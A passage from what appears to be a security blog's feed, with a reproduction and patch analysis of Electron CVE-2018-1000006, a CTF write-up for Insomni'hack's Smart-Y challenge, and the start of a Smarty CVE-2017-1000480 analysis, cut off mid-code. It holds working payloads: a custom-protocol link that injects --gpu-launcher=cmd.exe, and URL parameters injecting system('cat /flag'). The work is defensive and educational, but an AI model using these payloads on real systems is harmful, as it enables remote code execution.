class="string">'darwin'</span>) &#123;</div><div class="line">    app.quit()</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line">app.on(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (win === <span class="literal">null</span>) &#123;</div><div class="line">    createWindow()</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line">app.setAsDefaultProtocolClient(<span class="string">'chybeta'</span>)</div></pre></td></tr></table></figure></p>
<p>index.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">    This is a demo for CVE-2018-1000006<span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">    Electron version:<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(process.versions[<span class="string">'electron'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>.</div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>package.json:<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"name"</span>    : <span class="string">"CVE-2018-1000006 Demo"</span>,</div><div class="line">  <span class="attr">"version"</span> : <span class="string">"0.0.1"</span>,</div><div class="line">  <span class="attr">"main"</span>    : <span class="string">"main.js"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>包成exe应用,生成有漏洞的版本应用，这里我选择electron版本为1.7.8<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">electron-packager ./test elec_rce --win --out ./elec_rce --arch=x64 --version=0.0.1 --electron-version=1.7.8 --download.mirror=https://npm.taobao.org/mirrors/electron/</div></pre></td></tr></table></figure></p>
<h1 id="复现与分析"><a href="#复现与分析" class="headerlink" title="复现与分析"></a>复现与分析</h1><p>本地写一个html，其中协议的名称要与之前的设置对上，poc.html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	POC for CVE-2018-1000006</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"protocol"</span> <span class="attr">href</span>=<span class="string">'chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc'</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>payload: chybeta://?" "--no-sandbox" "--gpu-launcher=cmd.exe /c start calc<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>当点击一个链接时，会触发cmd，并弹出计算器:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/3.jpg?raw=true" alt=""></p>
<p>在electron的源码中，<a href="https://github.com/electron/electron/blob/b9c0bab8f1e8c40427db3d48da3d51481f6603c2/atom/browser/browser_win.cc#L212" target="_blank" rel="external">atom\browser\browser_win.cc的第212行</a>定义了SetAsDefaultProtocolClient方法：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">bool Browser::SetAsDefaultProtocolClient(const std::string&amp; protocol,</div><div class="line">                                        mate::Arguments* args) &#123;</div><div class="line">  // HKEY_CLASSES_ROOT</div><div class="line">  //    $PROTOCOL</div><div class="line">  //       (Default) = "URL:$NAME"</div><div class="line">  //       URL Protocol = ""</div><div class="line">  //       shell</div><div class="line">  //          open</div><div class="line">  //             command</div><div class="line">  //                (Default) = "$COMMAND" "%1"</div><div class="line">  //</div><div class="line">  // However, the "HKEY_CLASSES_ROOT" key can only be written by the</div><div class="line">  // Administrator user. So, we instead write to "HKEY_CURRENT_USER\</div><div class="line">  // Software\Classes", which is inherited by "HKEY_CLASSES_ROOT"</div><div class="line">  // anyway, and can be written by unprivileged users.</div><div class="line"></div><div class="line">  if (protocol.empty())</div><div class="line">    return false;</div><div class="line"></div><div class="line">  base::string16 exe;</div><div class="line">  if (!GetProtocolLaunchPath(args, &amp;exe))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  // Main Registry Key</div><div class="line">  HKEY root = HKEY_CURRENT_USER;</div><div class="line">  base::string16 keyPath = base::UTF8ToUTF16("Software\\Classes\\" + protocol);</div><div class="line">  base::string16 urlDecl = base::UTF8ToUTF16("URL:" + protocol);</div><div class="line"></div><div class="line">  // Command Key</div><div class="line">  base::string16 cmdPath = keyPath + L"\\shell\\open\\command";</div><div class="line"></div><div class="line">  // Write information to registry</div><div class="line">  base::win::RegKey key(root, keyPath.c_str(), KEY_ALL_ACCESS);</div><div class="line">  if (FAILED(key.WriteValue(L"URL Protocol", L"")) ||</div><div class="line">      FAILED(key.WriteValue(L"", urlDecl.c_str())))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  base::win::RegKey commandKey(root, cmdPath.c_str(), KEY_ALL_ACCESS);</div><div class="line">  if (FAILED(commandKey.WriteValue(L"", exe.c_str())))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>经过上述的注册表登记，通过查看注册表编辑器，可以发现多了一项：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/5.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;%1&quot;</div></pre></td></tr></table></figure>
<p>在<a href="https://msdn.microsoft.com/en-us/library/aa767914.aspx" target="_blank" rel="external">微软官方文档</a>中，在<code>Launching the Handler</code>一节中提到了在协议登记后如何启动应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">When ShellExecute executes the pluggable protocol handler with a stringon the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++&apos;s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters.</div></pre></td></tr></table></figure></p>
<p>所以当我们点击payload时，注册表中的<code>%1</code>被替换为我们的payload，双引号被成功闭合:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--gpu-launcher=cmd.exe /c start calc&quot;</div></pre></td></tr></table></figure></p>
<p>从而传递了第三个参数<code>--gpu-launcher=cmd.exe /c start calc</code>造成命令执行。</p>
<p>对参数传递有疑的可以用下面代码测试：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> count;</div><div class="line">    <span class="keyword">for</span>(count = <span class="number">0</span>;count &lt; argc ; count++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"argv[%d]: %s\n"</span>,count, argv[count]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    getchar();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>自己手动注册协议，参数解析情况如图：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/6.jpg?raw=true" alt=""></p>
<p>第三个参数<code>--gpu-launcher=cmd.exe /c start calc</code>会传递给Chromium，在<a href="https://peter.sh/experiments/chromium-command-line-switches/" target="_blank" rel="external">List of Chromium Command Line Switches</a>中总结了Chromium的命令行参数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/7.jpg?raw=true" alt=""></p>
<p>所以其实换其他参数也是能命令执行成功的，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--renderer-cmd-prefix=cmd.exe /c start calc</div></pre></td></tr></table></figure></p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>打包生成打上补丁的<a href="https://github.com/electron/electron/releases/tag/v1.8.2-beta.4" target="_blank" rel="external">版本1.8.2-beta.4</a>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">electron-packager ./test elec_rce_fixed --win --out ./elec_rce_fixed --arch=x64 --version=0.0.1 --electron-version=1.8.2-beta.4 --download.mirror=https://npm.taobao.org/mirrors/electron/</div></pre></td></tr></table></figure></p>
<p>再点击poc即可发现无法触发计算器。</p>
<p>这个漏洞仅影响win平台，究其根源在于windows用了双引号来传参，在<a href="https://msdn.microsoft.com/en-us/library/aa767914.aspx#Registering%20the%20Application%20Handling%20the%20Custom%20URI%20Scheme" target="_blank" rel="external">微软官方文档</a>中提到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To mitigate this issue:</div><div class="line"></div><div class="line">1. Avoid spaces, quotes, or backslashes in your URI</div><div class="line">2. Quote the %1 in the registration (&quot;%1&quot; as written in the &apos;alert&apos; example registration)</div></pre></td></tr></table></figure></p>
<p>好像就这个洞而言，第二条好像就被轻易饶过了。</p>
<p>Electron官方在 <a href="https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c" target="_blank" rel="external">commit-c49cb29ddf3368daf279bd60c007f9c015bc834c</a>修复该漏洞，主要是对参数的接受以及子进程的运行做了检查。</p>
<p>首先增加了对黑名单的验证，新增加了 <a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc" target="_blank" rel="external">app/command_line_args.cc</a>，其中<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc#L40" target="_blank" rel="external">第40行</a>增加了黑名单列表:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/9.jpg?raw=true" alt=""></p>
<p>由<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc#L1395" target="_blank" rel="external">CheckCommandLineArguments</a>进行验证：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/10.jpg?raw=true" alt=""></p>
<p>该验证函数在<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/atom_main.cc#L132" target="_blank" rel="external">atom/app/atom_main.cc的第132行</a>调用<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/11.jpg?raw=true" alt=""></p>
<p>另外还增加了对子进程的验证，在<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/browser/atom_browser_client.cc#L244" target="_blank" rel="external">atom/browser/atom_browser_client.cc的第244行</a>：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/12.jpg?raw=true" alt=""></p>
<p>MakeAbsoluteFilePath()是<a href="https://github.com/scheib/chromium/blob/f8675cbb337440a11bf9afb10ea11bae42bb92cb/base/files/file_util_win.cc#L85" target="_blank" rel="external">chromium定义的函数</a>，这段代码用于对于启动进程的路径检查，防止未知应用的启动。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/13.jpg?raw=true" alt=""></p>
<p>实际上，对黑名单的修补是不完善的，可以直接绕过，但后面对于路径的验证却难以绕过，因为路径验证的失败而直接导致程序崩溃。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上是我分析的一些想法，若有错误烦请各位师傅指出，谢谢各位师傅。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/1990&quot;&gt;阿里先知安全社区：Electron &amp;lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser 2018-Smart-Y-writeup</title>
    <link href="http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/"/>
    <id>http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/</id>
    <published>2018-01-23T12:23:33.000Z</published>
    <updated>2018-01-23T12:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>Insomni’hack teaser 2018-Smart-Y-writeup</p>
<p>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Last year, a nerd destroyed the system of Robot City by using some evident flaws. It seems that the system has changed <span class="keyword">and</span> is not <span class="keyword">as</span> evident to <span class="keyword">break</span> now.</div><div class="line"></div><div class="line">http:<span class="comment">//smart-y.teaser.insomnihack.ch</span></div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目给了<a href="http://smart-y.teaser.insomnihack.ch/console.php?hl" target="_blank" rel="external">源码</a>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>]))&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</div><div class="line"><span class="keyword">include_once</span>(<span class="string">'./smarty/libs/Smarty.class.php'</span>);</div><div class="line">define(<span class="string">'SMARTY_COMPILE_DIR'</span>,<span class="string">'/tmp/templates_c'</span>);</div><div class="line">define(<span class="string">'SMARTY_CACHE_DIR'</span>,<span class="string">'/tmp/cache'</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">news</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></div><div class="line">&#123;</div><div class="line">   <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name,&amp;$source,&amp;$mtime)</span></span></div><div class="line">   &#123;</div><div class="line">	   $template = <span class="string">"The news system is in maintenance. Please wait a year. &lt;a href='/console.php?hl'&gt;"</span>.htmlspecialchars(<span class="string">"&lt;&lt;&lt;DEBUG&gt;&gt;&gt;"</span>).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	   $source = $template;</div><div class="line">	   $mtime = time();</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Smarty configuration</span></div><div class="line">$smarty = <span class="keyword">new</span> Smarty();</div><div class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</div><div class="line">$my_security_policy-&gt;php_functions = <span class="keyword">null</span>;</div><div class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</div><div class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</div><div class="line">$smarty-&gt;enableSecurity($my_security_policy);</div><div class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</div><div class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</div><div class="line"></div><div class="line"></div><div class="line">$smarty-&gt;registerResource(<span class="string">'news'</span>,<span class="keyword">new</span> news);</div><div class="line">$smarty-&gt;display(<span class="string">'news:'</span>.(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? $_GET[<span class="string">'id'</span>] : <span class="string">''</span>));</div></pre></td></tr></table></figure></p>
<p>由源码的简洁性，推测是smarty框架的漏洞。通过扫目录可以发现存在smarty目录<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/11.jpg?raw=true" alt=""></p>
<p>查看change-log，得出smarty版本为3.1.31<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/12.jpg?raw=true" alt=""></p>
<p>利用<code>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;ls /&apos;);//</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/13.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://smart-y.teaser.insomnihack.ch/console.php?id=*/system(&apos;cat /flag&apos;);//</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/14.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INS&#123;why_being_so_smart-y&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Insomni’hack teaser 2018-Smart-Y-writeup&lt;/p&gt;
&lt;p&gt;CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2017-1000480]Smarty &lt;= 3.1.32 php代码执行 漏洞分析</title>
    <link href="http://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞分析/</id>
    <published>2018-01-23T04:49:24.000Z</published>
    <updated>2018-02-03T11:41:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://xianzhi.aliyun.com/forum/topic/1983" target="_blank" rel="external">阿里先知安全社区：Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】</a></p>
<p>在 Insomni-hack-teaser-2018 比赛中有一题Smart-Y，该题用到了CVE-2017-1000480。故此分析一波。文中测试代码基于<a href="http://smart-y.teaser.insomnihack.ch/console.php?hl" target="_blank" rel="external">Smart-Y源码</a>魔改。<br><a id="more"></a></p>
<h1 id="smarty简介"><a href="#smarty简介" class="headerlink" title="smarty简介"></a>smarty简介</h1><p>smarty是一个php模板引擎，其项目地址：<a href="https://github.com/smarty-php/smarty。" target="_blank" rel="external">https://github.com/smarty-php/smarty。</a></p>
<p>smarty据有模板编译功能。当访问一个模板文件时，smarty会根据模板文件在设置的编译目录中生成对应的php脚本（即编译文件），此后若再次访问该模板文件时，倘若模板文件未更新，则smarty会直接读取第一次生成的php脚本，而不是重新生成另一个。倘若访问另一个模板，则会生成另一个新的php脚本（编译文件）</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>测试环境：linux</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/1.jpg?raw=true" alt=""></p>
<p>根据commit信息，我们检出 6768340，此时漏洞还未修复。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">λ git <span class="built_in">clone</span> https://github.com/smarty-php/smarty.git</div><div class="line">λ <span class="built_in">cd</span> smarty\</div><div class="line">λ git checkout 6768340</div><div class="line">λ <span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
<p>index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span>(<span class="string">'./smarty/libs/Smarty.class.php'</span>);</div><div class="line">define(<span class="string">'SMARTY_COMPILE_DIR'</span>,<span class="string">'/tmp/templates_c'</span>);</div><div class="line">define(<span class="string">'SMARTY_CACHE_DIR'</span>,<span class="string">'/tmp/cache'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($name,&amp;$source,&amp;$mtime)</span></span></div><div class="line">    &#123;</div><div class="line">        $template = <span class="string">"CVE-2017-1000480 smarty PHP code injection"</span>;</div><div class="line">        $source = $template;</div><div class="line">        $mtime = time();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$smarty = <span class="keyword">new</span> Smarty();</div><div class="line">$my_security_policy = <span class="keyword">new</span> Smarty_Security($smarty);</div><div class="line">$my_security_policy-&gt;php_functions = <span class="keyword">null</span>;</div><div class="line">$my_security_policy-&gt;php_handling = Smarty::PHP_REMOVE;</div><div class="line">$my_security_policy-&gt;modifiers = <span class="keyword">array</span>();</div><div class="line">$smarty-&gt;enableSecurity($my_security_policy);</div><div class="line">$smarty-&gt;setCacheDir(SMARTY_CACHE_DIR);</div><div class="line">$smarty-&gt;setCompileDir(SMARTY_COMPILE_DIR);</div><div class="line">$smarty-&gt;registerResource(<span class="string">'test'</span>,<span class="keyword">new</span> test);</div><div class="line">$smarty-&gt;display(<span class="string">'test:'</span>.$_GET[<span class="string">'chybeta'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>参数通过<code>$smarty-&gt;display(&#39;test:&#39;.$_GET[&#39;chybeta&#39;]);</code>传入，<code>display</code>定义在 smarty_internal_templatebase.php 中，它调用了 <code>_execute</code>。</p>
<p><code>_execute</code>定义在<code>libs\sysplugins\smarty_internal_compile_assign.phpsmarty_internal_templatebase.php</code> 的 156 行左右，在该方法定义中，也即整个文件的174行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># smarty_internal_templatebase.php</span></div><div class="line"><span class="comment"># line about 175</span></div><div class="line"></div><div class="line">$template = $smarty-&gt;createTemplate($template, $cache_id, $compile_id, $parent ? $parent : <span class="keyword">$this</span>, <span class="keyword">false</span>);</div></pre></td></tr></table></figure></p>
<p>会调用<code>createTemplate</code>方法，将我们的传入的参数创建成一个模板，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180123/4.jpg?raw=true" alt=""></p>
<p>接着会调用render方法，进行模板渲染。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># smarty_internal_templatebase.php</div><div class="line"># line about 174</div><div class="line"></div><div class="line">$result = $template-&gt;render(false, $function);</div></pre></td></tr></table></figure></p>
<p>render方法定义在<code>libs\sysplugins\smarty_template_compiled.php</code>中，第105行开始对前面生成的模板进行处理：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># smarty_template_compiled</span></div><div class="line"><span class="comment"># line about 104</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;processed) &#123;</div><div class="line">	<span class="keyword">$this</span>-&gt;process($_template);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>process方法定义在第131行。现在初次访问，也即文件的第138行会对模板文件进行编译，即如简介中所言开始生成编译文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;exists || $smarty-&gt;force_compile ||</div><div class="line">	($smarty-&gt;compile_check &amp;&amp; $source-&gt;getTimeStamp() &gt; <span class="keyword">$this</span>-&gt;getTimeStamp())</div><div class="line">) &#123;</div><div class="line">	<span 